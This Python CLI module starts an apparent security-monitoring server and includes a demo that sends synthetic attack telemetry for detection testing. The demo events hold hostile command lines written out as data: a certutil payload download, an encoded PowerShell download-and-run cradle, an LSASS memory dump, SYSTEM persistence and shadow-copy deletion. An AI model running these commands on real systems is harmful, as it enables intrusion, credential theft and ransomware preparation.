"""CLI: python -m riskbyte serve | demo"""
from __future__ import annotations
import json, logging, sys, time, urllib.request

from . import config
from .api import make_server
from .service import Service


def serve():
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(name)s %(levelname)s %(message)s")
    try:
        cfg = config.load()
    except config.ConfigError as exc:
        sys.exit(f"configuration error: {exc}")
    svc = Service(cfg)
    svc.start()
    srv = make_server(svc, cfg.bind, cfg.port)
    logging.getLogger("riskbyte").info("Riskbyte listening on %s:%s (license: %s)", cfg.bind, cfg.port, svc.license_status()["state"])
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        svc.stop()
        srv.server_close()


def demo(base="http://127.0.0.1:8080", token="dev-ingest"):
    """Send realistic enterprise multi-stage cyber attack telemetry to a running instance."""
    now = time.time()
    events = []

    # 1. External Recon & SSH Brute Force from known malicious scanning node (T1110)
    for i in range(6):
        events.append({
            "ts": now - 300 + (i * 20),
            "host": "bastion-ssh-01",
            "process": "sshd",
            "action": "login",
            "outcome": "failure",
            "user": "root",
            "src_ip": "185.220.101.5",
            "message": f"Failed password for invalid user root from 185.220.101.5 port {42100 + i} ssh2"
        })

    # 2. Living Off The Land Binary (LOLBin) Payload Ingress (T1105)
    events.append({
        "ts": now - 180,
        "host": "fin-lt-042",
        "user": "m.silva",
        "process": "certutil.exe",
        "cmdline": "certutil.exe -urlcache -split -f https://c2.system-update-service.com/update.bin C:\\Windows\\Temp\\update.exe",
        "action": "process_start",
        "outcome": "success",
        "message": "CertUtil URLCache download initiated"
    })

    # 3. Encoded PowerShell Payload Execution & C2 Beaconing (T1059.001 / T1027)
    events.append({
        "ts": now - 120,
        "host": "fin-lt-042",
        "user": "m.silva",
        "process": "powershell.exe",
        "cmdline": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAtAGMAZABuAC0AZABlAGwAaQB2AGUAcgB5AC4AbwByAGcALwBhACcAKQA=",
        "dst_ip": "194.26.29.112",
        "action": "process_start",
        "outcome": "success",
        "message": "PowerShell executed with obfuscated base64 payload"
    })

    # 4. LSASS Process Credential Dumping (T1003.001)
    events.append({
        "ts": now - 60,
        "host": "fin-lt-042",
        "user": "m.silva",
        "process": "cmd.exe",
        "cmdline": "procdump.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp",
        "action": "process_start",
        "outcome": "success",
        "message": "ProcDump targeted LSASS memory dump"
    })

    # 5. Scheduled Task Persistence Creation (T1053.005)
    events.append({
        "ts": now - 30,
        "host": "fin-lt-042",
        "user": "SYSTEM",
        "process": "schtasks.exe",
        "cmdline": "schtasks.exe /create /tn \"SecurityHealthUpdate\" /tr \"C:\\Windows\\Temp\\update.exe\" /sc onlogon /ru SYSTEM",
        "action": "process_start",
        "outcome": "success",
        "message": "Persistent scheduled task registered under SYSTEM"
    })

    # 6. Ransomware Pre-Encryption Shadow Copy Deletion (T1490)
    events.append({
        "ts": now - 10,
        "host": "fin-lt-042",
        "user": "SYSTEM",
        "process": "vssadmin.exe",
        "cmdline": "vssadmin.exe delete shadows /all /quiet",
        "action": "process_start",
        "outcome": "success",
        "message": "Volume Shadow Copy deletion initiated"
    })

    req = urllib.request.Request(base + "/api/ingest", data=json.dumps(events).encode(), method="POST",
                                 headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req) as resp:
            print("Successfully ingested realistic attack telemetry:", resp.read().decode())
    except urllib.error.HTTPError as err:
        print("Ingest failed HTTP", err.code, err.read().decode())


if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "serve"
    {"serve": serve, "demo": demo}.get(cmd, lambda: sys.exit("usage: python -m riskbyte [serve|demo]"))()
